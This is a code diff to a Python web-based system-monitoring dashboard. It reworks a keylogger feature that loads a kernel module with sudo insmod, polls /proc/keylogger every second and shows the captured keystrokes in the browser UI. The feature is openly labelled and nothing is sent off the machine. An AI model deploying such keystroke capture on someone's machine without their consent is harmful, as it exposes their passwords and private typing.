@@ -4,9 +4,8 @@ import diskStats
 import cpuStats
 import processStats
 import netStats
-import tcpUdpConnStats
-import keylogger
-from helperFunctions import round2 
+import tcpUdpConnStats 
+from helperFunctions import round2, readFile
 import subprocess
 
 eel.init('web')
@@ -150,17 +149,26 @@ def updateDataThread():
 
 @eel.expose
 def toggleKeylogger(flag):
+    print("Toggle Keylogger ", flag)
     global KEYLOGGER_ON
     if flag:
         try:
             subprocess.run(["sudo","insmod","./driver/intrpt.ko"])
             KEYLOGGER_ON= flag
+            print("Turning on Keylogger")
         except:
             print("Error with insmod")
+
+        try:
+            eel.spawn(keyloggerThread)
+        except:
+            print("Error spawning keylogger thread")
     else:
         try:
-            subprocess.run(["sudo","rmmod","./driver/intrpt"])
+            subprocess.run(["sudo","rmmod","intrpt"])
             KEYLOGGER_ON = flag
+            
+            print("Turning off Keylogger")
         except:
             print("Error with rmmod")
             
@@ -172,23 +180,27 @@ def keyloggerThread():
     *********************************************************
     """  
     try:
-        while(True):
-            global KEYLOGGER_ON
-            if KEYLOGGER_ON:     
-                logData = keylogger.fetchAll()
-
-                if(logData):
-                    print(logData[2])
-                    eel.setLoggerData(logData)
+        global KEYLOGGER_ON
+        while(KEYLOGGER_ON): 
+            try:
+                logFile = readFile("/proc/keylogger") 
+                date = logFile[0:10]
+                time = logFile[11:19]
+                content = logFile[20:]
+                if(content):
+                    print(content)
+            
+                eel.setLoggerData([date, time, content])
+            except:
+                print("Error in keylogger fetching")
+            eel.sleep(1)
     except KeyboardInterrupt:
         print("Closing keylogger")
 
 
 eel.spawn(updateDataThread)
-eel.spawn(keyloggerThread)
 
 print("On browser navigate to : localhost:8000/main.html") 
-eel.start('main.html', mode="none")
-
+eel.start('main.html', mode="False") 
 
 
